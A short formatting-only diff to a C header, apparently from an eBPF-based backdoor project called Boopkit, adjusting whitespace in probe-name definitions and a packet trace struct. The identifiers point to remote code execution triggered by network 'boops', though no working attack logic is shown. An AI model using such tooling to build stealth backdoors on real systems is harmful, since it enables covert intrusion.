@@ -67,7 +67,7 @@ struct event_boop_t {
 // PROBE_BOOP is the eBPF probe to listen for boops
 #define PROBE_BOOP "pr0be.boop.o"
 #define PROBE_SAFE "pr0be.safe.o"
-#define PROBE_XDP  "pr0be.xdp.o"
+#define PROBE_XDP "pr0be.xdp.o"
 
 // TIMEOUT_SECONDS_RECVRCE is the amount of seconds to wait for recvrce()
 // after a boop
@@ -114,7 +114,7 @@ struct pkt_trace_metadata {
   __u16 cap_len;
   __u16 flags;
   __u16 prog_index;
-  int   action;
+  int action;
 } __packed;
 
 #endif  // BOOPKIT_BOOPKIT_H
